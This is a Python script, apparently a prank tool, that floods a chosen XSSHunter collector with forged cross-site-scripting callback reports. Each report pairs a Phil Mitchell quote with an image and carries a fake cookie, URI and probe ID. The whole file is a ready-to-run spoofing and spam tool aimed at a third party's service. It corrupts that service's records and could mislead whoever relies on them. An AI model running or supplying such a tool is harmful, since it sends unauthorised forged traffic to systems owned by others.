#!/usr/bin/env python

import argparse
import base64
import requests
import time
import uuid

header = (
    "  ______           _  __   __ _____  _____           _               \n"
    + " |  ____|         | | \ \ / // ____|/ ____|         | |              \n"
    + " | |__    __ _ ___| |_ \ V /| (___ | (___  _ __   __| | ___ _ __ ___\n"
    + " |  __|  / _` / __| __| > <  \___ \ \___ \| '_ \ / _` |/ _ \ '__/ __|\n"
    + " | |____| (_| \__ \ |_ / . \ ____) |____) | | | | (_| |  __/ |  \__ \\\n"
    + " |______|\__,_|___/\__/_/ \_\_____/|_____/|_| |_|\__,_|\___|_|  |___/\n"
)

quotes = [
    "You lookin' for me?",
    "This place needs a tidy up",
    "I dunno know what your talking about",
    "I'm scared of no-one",
    "Give it 'ere",
    "Still got the old footwork Phillip",
    "One for the road",
    "Smash the place up I told ya",
    "Another one bites the dust",
    "Well done Sherlock",
]


def send_request(hostname, quote, image):
    payload = {
        "uri": "https://www.facebook.com/utterphilth/videos/714075178978138/",
        "cookies": "peggy=mitchell",
        "referrer": "",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
        "browser-time": int(round(time.time() * 1000)),
        # Actual probe uses a fake uuid
        "probe-uid": str(uuid.uuid4()),
        "origin": "eastenders://",
        "injection_key": "[PROBE_ID]",
        "dom": quote,
        "screenshot": "data:image/png;base64," + image,
    }

    r = requests.post("https://" + hostname + "/js_callback", json=payload)
    return r.status_code


def main():

    parser = argparse.ArgumentParser(
        description="Spam pictures of Phil Mitchell and fake reports to XSSHunter collector instances."
    )
    parser.add_argument(
        "hostname", help="Target XSSHunter collector hostname. e.g example.xss.ht"
    )
    args = parser.parse_args()

    print (header)
    print ("Sending 10 Phils to " + args.hostname)

    for i in range(10):
        with open("images/" + str(i) + ".png", "rb") as imgFile:
            image = base64.b64encode(imgFile.read())

        if send_request(args.hostname, quotes[i], image) == 200:
            print "Phil Mitchell has been sent"

        time.sleep(0.5)

    print ("Done")


if __name__ == "__main__":
    main()
